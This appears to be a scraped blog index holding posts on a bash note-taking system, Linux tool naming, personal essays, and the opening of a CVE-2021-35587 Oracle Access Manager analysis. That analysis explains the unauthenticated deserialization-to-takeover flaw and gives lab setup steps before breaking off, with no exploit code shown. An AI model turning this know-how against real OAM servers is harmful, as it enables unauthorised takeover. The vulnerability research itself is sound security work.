一种快速增删改查临时笔记的方法 bob@pb:~$ yblog_del 101 rm: remove regular empty file \u0026#39;/mnt/d/typote/note/neokb/blog/101.md\u0026#39;? y bob@pb:~$ yblog_new 新建的主题 bob@pb:~$ yblog_list 100 开天辟地 102 bash常见用法 103 golang常见用法 104 python常见用法 105 java常见用法 106 一种快速增删改查临时笔记的方法 107 新建的主题 bob@pb:~$ yblog_open 106 bob@pb:~$ ls $blog_path 100.md 102.md 103.md 104.md 105.md 106.md 107.md bob@pb:~$ yblog_list | rg 用法 102 bash常见用法 103 golang常见用法 104 python常见用法 105 java常见用法 ","permalink":"https://ret2neo.cn/post/220914-blog-system-based-on-bash/","summary":"将以下命令加入 ~/.bashrc 文件，或者加入自定义的~/config/mybashrc 文件后再在~/bashrc中执行source ~/config/mybashrc 。\n（使用前需配置blog_path路径和typora路径，配合WSL食用效果更佳）\n1 2 3 4 5 6 7 8 alias update_mybashrc=\u0026#34;source /home/bob/.automan/mybashrc\u0026#34; # 博客相关功能，增删改查 blog_path=\u0026#39;/mnt/d/typote/note/neokb/blog\u0026#39; # 从编号100开始，逐个递增，每次新建会取当前最大的值加一，上限999 function yblog_new(){ touch $blog_path/100.md; echo $1 \u0026gt; $blog_path/$(($(ls $blog_path/*.md | grep -Po \u0026#34;\\d{3}(?=.md)\u0026#34;|sort -r|head -n1) +1)).md; } function yblog_del(){ rm -i $blog_path/$1.md; } function yblog_open(){ cd $blog_path; \u0026#39;/mnt/c/Program Files/Typora/Typora.exe\u0026#39; $1.md; cd -; } function yblog_list(){ for i in $(ls $blog_path/*.md);do echo $i |grep -Po \u0026#34;\\d{3}(?=.md)\u0026#34;|tr \u0026#34;\\n\u0026#34; \u0026#34;\\t\u0026#34;;head -n1 $i|tr -d \u0026#34;\\n\u0026#34;;echo \u0026#34;\u0026#34;;done } 可以查询、删除已有的笔记，指定主题新建一个笔记，也可以指定编号用typora打开对应的文件。","title":"基于bash的笔记系统：一种快速增删改查临时笔记的方法"},{"content":"无论是golang编写的工具，还是bash的alias或者function，使用命令时经常靠TAB补全。为了补全时混淆信息更少，统计了一下Linux常见工具的命名习惯，选择出使用频率最低的首字母等，作为自研工具命名的优先字符。 首先获取当前Linux上所有的可执行文件\n1 find / -executable -type f -exec file {} \\; 2\u0026gt;/dev/null | grep ELF |tee -a all.executable.files 然后取出名字列表\n1 cat all.executable.files |cut -d : -f 1 |sort -u|grep -Po \u0026#34;[^/]+$\u0026#34; | sort -u \u0026gt; all.executable.files.names 统计名字列表中首字母、第二个字母、第三个字母的使用频率\n1 2 3 grep -Po \u0026#34;^\\S\u0026#34; all.executable.files.names|sort |uniq -c |sort -nrk1|grep -Po \u0026#34;\\S$\u0026#34;|tr -d \u0026#34;\\n\u0026#34; grep -Po \u0026#34;^\\S\\S\u0026#34; all.executable.files.names|grep -Po \u0026#34;\\S$\u0026#34;|sort |uniq -c |sort -nrk1 |grep -Po \u0026#34;\\S$\u0026#34;|tr -d \u0026#34;\\n\u0026#34; grep -Po \u0026#34;^\\S\\S\\S\u0026#34; all.executable.files.names|grep -Po \u0026#34;\\S$\u0026#34;|sort |uniq -c |sort -nrk1 |grep -Po \u0026#34;\\S$\u0026#34;|tr -d \u0026#34;\\n\u0026#34; 结果是\n1 2 3 slgpxa_cmrndtfuibhevwkjozqXQC7yMWNVTSRIHF3[ iteaolrpscmydfunvhbgkw8xz2qSj1M4-B.VTRPLIGA0 stacrbkpiofnleumdvgh-6w_yxjq1H25zWDLRPMIECA3. 另一台云上虚拟机的结果是\n1 2 3 slgp_cxmndrtfaubijevwkozhqNyVMGDC3[ ieoypasrtcmndhu8lkfvbxwgzq2j4+.SPNMG90_ sbtnaroiceumpdlf6gk-hwvyxzq_j.1+SHA52 可以看到结果大同小异，首字母用的最少的是y，倒数第二少的是q，第二个字母用的最少的是j，第二少的是q。看了下y开头的只有yes，可见工具命名应该多用y开头。\n","permalink":"https://ret2neo.cn/post/220914-howto-name-tools/","summary":"无论是golang编写的工具，还是bash的alias或者function，使用命令时经常靠TAB补全。为了补全时混淆信息更少，统计了一下Linux常见工具的命名习惯，选择出使用频率最低的首字母等，作为自研工具命名的优先字符。 首先获取当前Linux上所有的可执行文件\n1 find / -executable -type f -exec file {} \\; 2\u0026gt;/dev/null | grep ELF |tee -a all.executable.files 然后取出名字列表\n1 cat all.executable.files |cut -d : -f 1 |sort -u|grep -Po \u0026#34;[^/]+$\u0026#34; | sort -u \u0026gt; all.executable.files.names 统计名字列表中首字母、第二个字母、第三个字母的使用频率\n1 2 3 grep -Po \u0026#34;^\\S\u0026#34; all.executable.files.names|sort |uniq -c |sort -nrk1|grep -Po \u0026#34;\\S$\u0026#34;|tr -d \u0026#34;\\n\u0026#34; grep -Po \u0026#34;^\\S\\S\u0026#34; all.executable.files.names|grep -Po \u0026#34;\\S$\u0026#34;|sort |uniq -c |sort -nrk1 |grep -Po \u0026#34;\\S$\u0026#34;|tr -d \u0026#34;\\n\u0026#34; grep -Po \u0026#34;^\\S\\S\\S\u0026#34; all.","title":"自研小工具如何命名"},{"content":" 被风刮来刮去，麦子能说个啥? 被飞过的麻雀啄食，麦子能说个啥? 被自家驴啃了，麦子能说个啥? 被夏天的镰刀割去，麦子能说个啥? 被当作种子，麦子又能说个啥?\n《yrcy》\n时值中秋，花好月圆，天下太平，值得写上几笔。\n看了《温暖的抱抱》和一点《yrcy》，现代人谁没点精神疾病，现实就像贾医生搭建的心灵净土。论苦难，没几个比马老四惨，论心理健康，也没几个好过马老四。\n纳瓦尔说\u0026quot;别太把自己当回事，你只是一只会做计划的猴子”，刘慈欣写“人生啊，人生这东西……变幻莫测，一切都是概率和机遇，就像在一条小溪中漂着的一根小树枝，让一块小石头绊住了，或让一个小旋涡圈住了……”。\n生活是一场随机游戏，意思是，苦难和幸运都在其中，意义和荒诞都能被挖掘出来。维克多·弗兰克尔觉得途经工作、爱和苦难能寻得意义，而加缪觉得不过是荒诞，人可以靠哲学或生理自杀逃离荒诞，也可以选择在荒诞中存活下去。\n宇宙是混沌、漠然非理性的，人想清醒地在这无望的荒诞中存活下去，就要无诉求地生活（live without appeal），对任何人任何事不报有任何期待，于是你会有真正的平静。像鲍抱一样寻求绝对秩序最后只会无法忍受。人们多少恐惧混乱，但生活的真谛和希望可能就在其中。所以，要允许混乱发生。\n想过更具体的生活，试着做一个肥牛抱蛋，抱得有点太严实了，像没抱过蛋似的，有点好笑。忽觉能偶尔有用于抽象思考的闲暇是一种巨大的幸运。大地上的无数生灵之中，你在过的其实已是一种不错的生活。虽然苦难从来不应该被歌颂，但每每见到贫穷、衰老、病痛、死亡、匮乏和压迫，我便重新审视生活。生老病死、爱别离、怨憎会、求不得、色受想行识五阴炽盛，苦是生活最好的老师。物质相对富足多少使心灵日益麻木坚硬，我早已不是那个能为陌生天桥老人悲惨境遇而难过徘徊一整个下午的少年，能使我内心颤动的时刻也越来越少，但内心深处还有个隐秘而狭窄的角落，存放着从偏远乡村带来的初心，存放着孟轲所说的恻隐之心。\n鲍抱的疏离，其实是一种恐惧，伴生一种沉闷和无望，而有些人伴生的是冷峻生涩的幽默感，背后是上下求索和野蛮生长，是渴望理解的孤独，是离经叛道的渴望，也是玩世不恭的自恋。从外部看，后者呈现一种诡异可疑的形态，甚至有些滑稽吓人。但从内看，其实已经是他能长成的最好的样子了。后者的典型就是小丑。\n小丑觉得人们真没礼貌，鲍抱觉得拥抱有害健康，敏感脆弱之下潜藏着病变的危险。保持迟钝，接受混乱，拥抱无明，似乎是在都市生活里保持精神健康的正途。其实正常未必是真正的健康，只是多数时候，人们要学会和病毒共存。\n","permalink":"https://ret2neo.cn/mind/220910-mid-autumn/","summary":"被风刮来刮去，麦子能说个啥? 被飞过的麻雀啄食，麦子能说个啥? 被自家驴啃了，麦子能说个啥? 被夏天的镰刀割去，麦子能说个啥? 被当作种子，麦子又能说个啥?\n《yrcy》\n时值中秋，花好月圆，天下太平，值得写上几笔。\n看了《温暖的抱抱》和一点《yrcy》，现代人谁没点精神疾病，现实就像贾医生搭建的心灵净土。论苦难，没几个比马老四惨，论心理健康，也没几个好过马老四。\n纳瓦尔说\u0026quot;别太把自己当回事，你只是一只会做计划的猴子”，刘慈欣写“人生啊，人生这东西……变幻莫测，一切都是概率和机遇，就像在一条小溪中漂着的一根小树枝，让一块小石头绊住了，或让一个小旋涡圈住了……”。\n生活是一场随机游戏，意思是，苦难和幸运都在其中，意义和荒诞都能被挖掘出来。维克多·弗兰克尔觉得途经工作、爱和苦难能寻得意义，而加缪觉得不过是荒诞，人可以靠哲学或生理自杀逃离荒诞，也可以选择在荒诞中存活下去。\n宇宙是混沌、漠然非理性的，人想清醒地在这无望的荒诞中存活下去，就要无诉求地生活（live without appeal），对任何人任何事不报有任何期待，于是你会有真正的平静。像鲍抱一样寻求绝对秩序最后只会无法忍受。人们多少恐惧混乱，但生活的真谛和希望可能就在其中。所以，要允许混乱发生。\n想过更具体的生活，试着做一个肥牛抱蛋，抱得有点太严实了，像没抱过蛋似的，有点好笑。忽觉能偶尔有用于抽象思考的闲暇是一种巨大的幸运。大地上的无数生灵之中，你在过的其实已是一种不错的生活。虽然苦难从来不应该被歌颂，但每每见到贫穷、衰老、病痛、死亡、匮乏和压迫，我便重新审视生活。生老病死、爱别离、怨憎会、求不得、色受想行识五阴炽盛，苦是生活最好的老师。物质相对富足多少使心灵日益麻木坚硬，我早已不是那个能为陌生天桥老人悲惨境遇而难过徘徊一整个下午的少年，能使我内心颤动的时刻也越来越少，但内心深处还有个隐秘而狭窄的角落，存放着从偏远乡村带来的初心，存放着孟轲所说的恻隐之心。\n鲍抱的疏离，其实是一种恐惧，伴生一种沉闷和无望，而有些人伴生的是冷峻生涩的幽默感，背后是上下求索和野蛮生长，是渴望理解的孤独，是离经叛道的渴望，也是玩世不恭的自恋。从外部看，后者呈现一种诡异可疑的形态，甚至有些滑稽吓人。但从内看，其实已经是他能长成的最好的样子了。后者的典型就是小丑。\n小丑觉得人们真没礼貌，鲍抱觉得拥抱有害健康，敏感脆弱之下潜藏着病变的危险。保持迟钝，接受混乱，拥抱无明，似乎是在都市生活里保持精神健康的正途。其实正常未必是真正的健康，只是多数时候，人们要学会和病毒共存。","title":"中秋"},{"content":" 人真的是适应性很强的动物。从24h续航的核酸，无处不在的场所码打卡，到花样百出的赋予意义，形式各异的抗拒自由，最终都能自然融入日复一日的循环。\n人的大部分行为像是编码过。和奶奶通电话总勾起些回忆的细节，香甜的红薯干，幼时翻越过的山野，爷爷讲过的经书，大殿里神秘威严的千手千眼。但老人常常重复同样的故事，似乎trigger一到，同样的话总是以同样的语气脱口而出，同此前的无数次对话一样。我也是如此，很多人也是如此，同样的情绪/事件/场景触发点总是导致同样的动作语言和反应。人的所谓成长，大约就是以主动植入的更好的编码替代被动执行的不那么好的编码。主动植入更好编码的过程大约也就是易卜生所说的，将你这块材料铸造成器的过程。\n担负起责任，才可能有自由。纯粹的自由无处不在，但总是难以被直面，无法被享受。人们做的大部分事情是在逃避纯粹的自由，麻痹真实的自我。只有做出选择，承担责任，才能最小程度被选择被决定，才是在按照你的意愿与世界交互，在按你的内心尝试改造世界。然后幸运的话，你能做成一点事情，品尝到限量的自由。\n有朋友在疑心自己该做什么，其实不要陷得太深。我们觉得今天这样的生活会一直持续下去，其实不会，好时光并不会太多，不要在犹疑寻找和等待中辜负它。\n我们大可以始终以浏览之心度过生活，但应该及早停止旁观和等待。如果生活像代码，我们要做的不是audit，而且迭代式地快速edit和evaluate。\n","permalink":"https://ret2neo.cn/mind/220904-your-responsibility/","summary":"人真的是适应性很强的动物。从24h续航的核酸，无处不在的场所码打卡，到花样百出的赋予意义，形式各异的抗拒自由，最终都能自然融入日复一日的循环。\n人的大部分行为像是编码过。和奶奶通电话总勾起些回忆的细节，香甜的红薯干，幼时翻越过的山野，爷爷讲过的经书，大殿里神秘威严的千手千眼。但老人常常重复同样的故事，似乎trigger一到，同样的话总是以同样的语气脱口而出，同此前的无数次对话一样。我也是如此，很多人也是如此，同样的情绪/事件/场景触发点总是导致同样的动作语言和反应。人的所谓成长，大约就是以主动植入的更好的编码替代被动执行的不那么好的编码。主动植入更好编码的过程大约也就是易卜生所说的，将你这块材料铸造成器的过程。\n担负起责任，才可能有自由。纯粹的自由无处不在，但总是难以被直面，无法被享受。人们做的大部分事情是在逃避纯粹的自由，麻痹真实的自我。只有做出选择，承担责任，才能最小程度被选择被决定，才是在按照你的意愿与世界交互，在按你的内心尝试改造世界。然后幸运的话，你能做成一点事情，品尝到限量的自由。\n有朋友在疑心自己该做什么，其实不要陷得太深。我们觉得今天这样的生活会一直持续下去，其实不会，好时光并不会太多，不要在犹疑寻找和等待中辜负它。\n我们大可以始终以浏览之心度过生活，但应该及早停止旁观和等待。如果生活像代码，我们要做的不是audit，而且迭代式地快速edit和evaluate。","title":"你最大的责任就是把你这块材料铸造成器"},{"content":" 搬进新居带来一些细微的好的感受和意外的惊喜，尤其是午后这缕热烈的阳光。 越发觉得，生活在感受和选择中存在，不在想象和推理中发生。 我想我会继续效仿《好好先生》，对生活中一切涌现的机缘说“是”，看看生活将我带向何处。\n","permalink":"https://ret2neo.cn/mind/220828-yes-man/","summary":"搬进新居带来一些细微的好的感受和意外的惊喜，尤其是午后这缕热烈的阳光。 越发觉得，生活在感受和选择中存在，不在想象和推理中发生。 我想我会继续效仿《好好先生》，对生活中一切涌现的机缘说“是”，看看生活将我带向何处。","title":"Yes Man"},{"content":" 旧友即将远行。一场别宴，几局乒乓后，沿着城市空旷的街道漫步，嗦着绿豆冰棍，对面是校园操场，身后是核酸检测点，巨大的树荫下，我们站在一起，觉得深圳此刻的风很有夏天的感觉。\n和所有时刻一样，这样的时刻在一生中只有一次，只是当时的我们不会觉得有什么不同。\n茨威格说，“人世间闲暇的数百万个小时流逝，方出现一个真正的历史性时刻、人类星光璀璨的时辰”，但要我说，每个时刻屏住呼吸，那片独属于你的夜空都在星光闪烁。\n“别离是人间第一浪漫之事，因为此后的相遇都是重逢”，为多体味这份浪漫，我决定提笔送别cty，也送别我离开校园的第三年。\n**我要出发，不管远方多远。**在意识到要去的城市比想象中远不少时，我们相视大笑。我很理解，眼中只有目的地，羁绊与路途都不成问题，这便是青年人的勇气，“生猛莽撞不问明天”。从lzb/wzp/cbw/ly/ywq/wjz/htl/cty到我自己，生活变迁时有，聚散不由分说，每一条岔路，既是命运也是选择，既是告别也是成长。为了靠近创业梦想、高强技术、浪漫爱情、宜居城市，或为了远离乏味现状，无边寂寥，渺茫前景，人们改变自己的生活状态，并基于各种理由相信远方会更好。于是人们做出决定，收拾行囊，翌日出发。我喜欢这样生机勃勃的世界，也总喜欢在这样的节点停下来想想，品味别离带来的那种无言的酸涩。我知道重逢会有欣喜，但在告别很多人之后也确实很久没有见到第二面，更深知再见也非从前。生活便是如此，好在每个人都有他的远方。\n**人们为何生活？**三年前我离开厦门，在铺满海面的夕阳万丈中为操钥发藏摩拳擦掌，辗转几城后只身去到东莞，开始淹没于新鲜的生活，感受许多第一次带来的冲击。然后，和很多人一样，开始过一个模子的生活。然后，来到深圳，如法炮制。一路走过，周遭的景致不断变化，但始终心怀那个从孩童时期就冒出来的疑问（《自由、死亡、孤独与无意义》）。我敏感于事物的消逝，体察到其中的虚无，我观察生活，测试生活，想要一个答案，却并不确切问题是什么。我在生活之中，却也游离在生活之外。如此这般，反反复复，敲敲打打，没完没了。这不是好的体验，却也算我的历练。\n**人们如何生活？**有些问题的唯一解法是让它们不成问题，譬如生活的意义。因为他们本不成问题，敲打他们是自寻烦恼。时过境迁我也无法完全理解当时的自己，但我想这条路我不是唯一走过的，望后来者自求多福。如今我更关心人应当如何生活，怎样的生活方式和生活目标真正值得和适合去追求。继续敲打，道阻且长。\n**人应当生活在他人之中。**马克思说人是社会关系的总和，桀骜不驯自称只爱真理的爱因斯坦想赶在希尔伯特之前解出方程，卢梭从未想过久居瓦尔登湖，我在南禅寺体验过的那种绝不想久浸其中的至深孤独，经此种种，如今我坚信，离群索居绝非正道，有违自然规律，属于倒行逆施。正确的生活方式应该是生活在人群中，但按照舒适感决定介入程度，并和部分人保持深度联系。而且也许，人际关系和幸福感确实是成正相关的。\n**一点偏见。**过去我觉得世相多是刻舟求剑、缘木求鱼，世人多是阿Q，时或掩耳盗铃。也感叹，只有这样人才能面对有限，只有朝露般的欢愉或沉痛能解无常之渴。最近偶尔不那么执着于这些恶见了，但离真正“加入其中，运转起来”还有距离，需多体悟和实践。还是那句话，黑暗是缺少光明，我需要更多光明。我蛮开心近来结识的一些朋友，如何生活在他们看来似乎完全不成为问题，我要向他们多学习。愿自己能着眼光明，永远乐观，心怀希望。\n最后，记录最近一些aha时刻的感悟和一些某些时刻重新领悟所言非虚的老生常谈：\n一个人的永远，就是他的一生\n给比拿愉快\n人在冲突中才能成长\n凡是你能做成的事，都是简单的，只要坚持做就行了。凡是你做不成的事，就不必费太多心思。\n大处着眼，小处着手\n存心时时可死，行事步步求生\n实事求是，不要依赖巧合生活\n幸福快乐的首要是一个人愿意成为他自己\n看不如做，做不如教\n过度自我关注是痛苦之源\n不用种，生命自己就能找到蓬勃之路。——《庆余年》\n","permalink":"https://ret2neo.cn/mind/220717-society-age-3/","summary":"旧友即将远行。一场别宴，几局乒乓后，沿着城市空旷的街道漫步，嗦着绿豆冰棍，对面是校园操场，身后是核酸检测点，巨大的树荫下，我们站在一起，觉得深圳此刻的风很有夏天的感觉。\n和所有时刻一样，这样的时刻在一生中只有一次，只是当时的我们不会觉得有什么不同。\n茨威格说，“人世间闲暇的数百万个小时流逝，方出现一个真正的历史性时刻、人类星光璀璨的时辰”，但要我说，每个时刻屏住呼吸，那片独属于你的夜空都在星光闪烁。\n“别离是人间第一浪漫之事，因为此后的相遇都是重逢”，为多体味这份浪漫，我决定提笔送别cty，也送别我离开校园的第三年。\n**我要出发，不管远方多远。**在意识到要去的城市比想象中远不少时，我们相视大笑。我很理解，眼中只有目的地，羁绊与路途都不成问题，这便是青年人的勇气，“生猛莽撞不问明天”。从lzb/wzp/cbw/ly/ywq/wjz/htl/cty到我自己，生活变迁时有，聚散不由分说，每一条岔路，既是命运也是选择，既是告别也是成长。为了靠近创业梦想、高强技术、浪漫爱情、宜居城市，或为了远离乏味现状，无边寂寥，渺茫前景，人们改变自己的生活状态，并基于各种理由相信远方会更好。于是人们做出决定，收拾行囊，翌日出发。我喜欢这样生机勃勃的世界，也总喜欢在这样的节点停下来想想，品味别离带来的那种无言的酸涩。我知道重逢会有欣喜，但在告别很多人之后也确实很久没有见到第二面，更深知再见也非从前。生活便是如此，好在每个人都有他的远方。\n**人们为何生活？**三年前我离开厦门，在铺满海面的夕阳万丈中为操钥发藏摩拳擦掌，辗转几城后只身去到东莞，开始淹没于新鲜的生活，感受许多第一次带来的冲击。然后，和很多人一样，开始过一个模子的生活。然后，来到深圳，如法炮制。一路走过，周遭的景致不断变化，但始终心怀那个从孩童时期就冒出来的疑问（《自由、死亡、孤独与无意义》）。我敏感于事物的消逝，体察到其中的虚无，我观察生活，测试生活，想要一个答案，却并不确切问题是什么。我在生活之中，却也游离在生活之外。如此这般，反反复复，敲敲打打，没完没了。这不是好的体验，却也算我的历练。\n**人们如何生活？**有些问题的唯一解法是让它们不成问题，譬如生活的意义。因为他们本不成问题，敲打他们是自寻烦恼。时过境迁我也无法完全理解当时的自己，但我想这条路我不是唯一走过的，望后来者自求多福。如今我更关心人应当如何生活，怎样的生活方式和生活目标真正值得和适合去追求。继续敲打，道阻且长。\n**人应当生活在他人之中。**马克思说人是社会关系的总和，桀骜不驯自称只爱真理的爱因斯坦想赶在希尔伯特之前解出方程，卢梭从未想过久居瓦尔登湖，我在南禅寺体验过的那种绝不想久浸其中的至深孤独，经此种种，如今我坚信，离群索居绝非正道，有违自然规律，属于倒行逆施。正确的生活方式应该是生活在人群中，但按照舒适感决定介入程度，并和部分人保持深度联系。而且也许，人际关系和幸福感确实是成正相关的。\n**一点偏见。**过去我觉得世相多是刻舟求剑、缘木求鱼，世人多是阿Q，时或掩耳盗铃。也感叹，只有这样人才能面对有限，只有朝露般的欢愉或沉痛能解无常之渴。最近偶尔不那么执着于这些恶见了，但离真正“加入其中，运转起来”还有距离，需多体悟和实践。还是那句话，黑暗是缺少光明，我需要更多光明。我蛮开心近来结识的一些朋友，如何生活在他们看来似乎完全不成为问题，我要向他们多学习。愿自己能着眼光明，永远乐观，心怀希望。\n最后，记录最近一些aha时刻的感悟和一些某些时刻重新领悟所言非虚的老生常谈：\n一个人的永远，就是他的一生\n给比拿愉快\n人在冲突中才能成长\n凡是你能做成的事，都是简单的，只要坚持做就行了。凡是你做不成的事，就不必费太多心思。\n大处着眼，小处着手\n存心时时可死，行事步步求生\n实事求是，不要依赖巧合生活\n幸福快乐的首要是一个人愿意成为他自己\n看不如做，做不如教\n过度自我关注是痛苦之源\n不用种，生命自己就能找到蓬勃之路。——《庆余年》","title":"三年回首，一点告别"},{"content":"漏洞概况 CVE公告\nVulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).\n—— https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587\nOAM是什么\nOracle Access Manager (OAM) 提供身份管理（使用用户、组和机构管理、自助服务、流程管理功能和委托管理）、验证和授权服务，以及合规性报告。\n可以理解为Oracle生态中一套单点登陆系统。\nCVE-2021-35587能达成什么效果\n利用该漏洞，任意能够访问OAM的攻击者，无需认证即可攻占OAMServer。\nCVE-2021-35587的影响版本有哪些\n11.1.2.3.0, 12.2.1.3.0, 12.2.1.4.0\n——https://www.oracle.com/security-alerts/cpujan2022.html#AppendixFMW\n基本原理\n这是一个Java原生反序列化漏洞，接受和处理反序列化数据的接口是无认证的。\n因为OAM包含weblogic，所以反序列化过程可以借助weblogic的gadget达成任意Java代码执行，进而执行任意命令以攻占服务器，getshell和横向移动。\n本地搭建OAM 因为这是一套相对复杂的环境，所以搭建可用的OAM调试分析环境在利用CVE-2021-35587这个漏洞的过程中占据了相当大一部分时间。在这一点上，漏洞原作者和我有同样的体会。为了节省后来的分析者，以及以后的自己的宝贵的时间，我把OAM环境搭建方法和搭建过程中踩到的各种各样的坑总结在此。\n大纲 参考 https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/#Background 使用方法2获取OAM镜像\nDownload a prebuilt OAM image from Oracle Container Registry by by navigating to Middleware \u0026gt; oam. This image contains no patches and should only be used in Developer or Test environments. 下载到的OAM镜像用于跑起来三个OAM容器\nWebLogic Administration Server (AdminServer) OAM Managed Server (oam_server1) OAM Policy Manager Managed Server (oam_policy_mgr1) 跑起来这三个容器依赖一个可用的Oracle数据库\n步骤汇总 创建一台全新的Ubuntu18.04，切换到root用户。\n在 https://hub.docker.com/_/oracle-database-enterprise-edition 和 https://container-registry.oracle.com/ 登录账号后同意协议。（参考步骤二）\n安装docker\n1 2 # apt update # apt install docker.io docker 登录dockerhub 和 container-registry.oracle.com\n1 2 3 4 # ocker login 输入 login.docker.com 的账号密码\t# docker login container-registry.oracle.com 输入 login.oracle.com 的账号密码 拉取两个镜像\n1 2 # docker pull store/oracle/database-enterprise:12.2.0.1 # docker pull container-registry.oracle.com/middleware/oam:12.2.1.4.0 一些准备工作\n1 2 3 # docker network create -d bridge OamNET # mkdir -p /scratch/user_projects # chmod 777 /scratch/user_projects 启动四个容器（注意：将以下命令中的172.17.0.1替换为docker虚拟网卡网关的IP）\n1 2 3 4 docker run -d -it --name myOracleDB -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 docker run -d -p 14100:14100 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \u0026#34;/u01/oracle/dockertools/startMS.sh\u0026#34; docker run -d -p 15100:15100 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \u0026#34;/u01/oracle/dockertools/startMS.sh\u0026#34; 查看各服务的IP地址\n1 docker inspect -f \u0026#39;{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}\u0026#39; oamadmin oamms oampolicy myOracleDB 使用以下链接访问服务。（注意：将192.168.0.105替换为虚拟机IP）\n1 2 3 4 5 6 7 账号：weblogic 密码：W3bl@gic WebLogic Administration Console http://192.168.0.105:7001/console Oracle Enterprise Manager Console http://192.168.0.105:7001/em Oracle Access Management Console http://192.168.0.105:7001/oamconsole OAM Server Logout http://192.168.0.105:14100/oam/server/logout Policy Manager Access http://192.168.0.105:15100/access ①运行Oracle数据库 创建Oracle数据库 参考 https://hub.docker.com/_/oracle-database-enterprise-edition 登陆账号后跳转到 https://hub.docker.com/u/findneo/content/sub-3762ef81-7448-4275-909b-df7e6b5d4070 ，同意协议。\n1 2 3 4 5 6 7 8 # sudo docker login 输入docker hub的账号密码 # sudo docker pull store/oracle/database-enterprise:12.2.0.1 拉取镜像 # sudo docker run -d -it --name myOracleDB -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 运行起来一个Oracle数据库，并且开放到本地的1521端口 测试数据库连接 安装sqlplus 参考https://askubuntu.com/questions/159939/how-to-install-sqlplus\nstep1: 1 # sudo apt-get install alien step2: 在 https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html 下载3个文件 oracle-instantclient12.2-basic-12.2.0.1.0-1.x86_64.rpm oracle-instantclient12.2-sqlplus-12.2.0.1.0-1.x86_64.rpm oracle-instantclient12.2-devel-12.2.0.1.0-1.x86_64.rpm\nstep3: 1 2 3 # sudo alien -i oracle-instantclient*-basic*.rpm # sudo alien -i oracle-instantclient*-sqlplus*.rpm # sudo alien -i oracle-instantclient*-devel*.rpm step4: 1 # sudo apt-get install libaio1 step5: 1 2 # sudo sensible-editor /etc/ld.so.conf.d/oracle.conf 粘贴右侧内容： /usr/lib/oracle/12.2/client64/lib/ step6: sudo ldconfig\nstep7 测试链接 1 2 # sqlplus64 sys/Oradoc_db1@//127.0.0.1:1521/ORCLCDB.localdomain as sysdba # sqlplus64 sys/Oradoc_db1@//172.17.0.1:1521/ORCLPDB1.localdomain as sysdba 其他：sqlplus64的用法 sqlplus64的用法：sqlplus [ [\u0026lt;option\u0026gt;] [{logon | /nolog}] [\u0026lt;start\u0026gt;] ]\n其中\u0026lt;logon\u0026gt; 是\n1 {\u0026lt;username\u0026gt;[/\u0026lt;password\u0026gt;][@\u0026lt;connect_identifier\u0026gt;] | / } [AS {SYSDBA | SYSOPER | SYSASM | SYSBACKUP | SYSDG | SYSKM | SYSRAC}] [EDITION=value] 其中\u0026lt;connect_identifier\u0026gt;可以是如下格式 @[\u0026lt;net_service_name\u0026gt; | [//]Host[:Port]/\u0026lt;service_name\u0026gt;]\n如何知道 service_name 或者 net_service_name？Oracle数据库容器镜像文档 说service_name定义在环境变量TNS_ADMIN定义的目录下的tnsnames.ora文件中， 进容器看到 TNS_ADMIN=/u01/app/oracle/product/12.2.0/dbhome_1/admin/ORCLCDB ，tnsnames.ora文件内容为\n1 2 ORCLCDB = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLCDB.localdomain) ) ) ORCLPDB1 = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLPDB1.localdomain) ) ) 所以 SERVICE_NAME 可以是 ORCLCDB.localdomain 或者 ORCLPDB1.localdomain 。\n②下载OAM镜像 进入 https://container-registry.oracle.com/ ，点击右上角Sign In，登陆自己的Oracle账号，然后点击MiddleWare，然后点击OAM。\n在右侧区域同意协议，然后才可以下载。\n否则即使docker login，还是无法下载，会提示\nError response from daemon: pull access denied for container-registry.oracle.com/middleware/oam, repository does not exist or may require ‘docker login’: denied: requested access to the resource is denied。\n同意协议之后执行以下命令\n1 # sudo docker login container-registry.oracle.com 输入在Oracle注册的账号密码\n1 # sudo docker pull 